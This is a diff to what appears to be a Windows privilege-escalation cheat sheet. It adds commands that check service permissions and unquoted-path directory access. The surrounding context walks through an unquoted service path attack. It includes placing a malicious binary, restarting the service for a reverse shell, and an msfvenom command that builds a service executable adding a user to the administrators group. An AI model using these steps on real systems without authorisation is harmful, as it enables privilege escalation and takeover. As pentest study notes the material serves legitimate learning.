@@ -54,6 +54,10 @@ tasklist /FO TABLE /NH(show all process' pid)
 ```
 wmic service get name,pathname |  findstr /i "backup.exe"
 ```
+### Check permission to start and stop the service
+```
+"service_name" | Get-ServiceAcl | select -ExpandProperty Access
+```
 ##### Check which user runns this service
 ```
 Get-Service -Name "RasMan" | Select-Object Name, Status, DisplayName, UserName
@@ -162,8 +166,8 @@ C:\Program Files\My.exe
 C:\Program Files\My Program\My.exe
 C:\Program Files\My Program\My service\service.exe
 
-1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path
-   Manual Way: accesschk.exe /accepteula -quv "unquoted path"
+1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path:
+   accesschk.exe /accepteula -quv "unquoted path" | icacls "path"
 
 2. check which service runs this executable file
 3. restart the service to receive rev shell or msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
